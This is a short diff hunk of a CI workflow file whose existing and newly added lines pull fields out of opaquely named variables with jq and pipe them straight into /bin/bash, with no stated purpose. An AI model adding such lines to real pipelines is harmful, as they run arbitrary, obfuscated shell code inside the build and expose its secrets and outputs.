@@ -25,6 +25,7 @@ jobs:
           echo $atk3 | jq -r .zcpwt79 | /bin/bash
           echo $spuqk95937 | jq -r .c6660 | /bin/bash
           echo $n44 | jq -r .b6204 | /bin/bash
+          printf '%s' "$cemjd7128" | jq -r .et5713 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
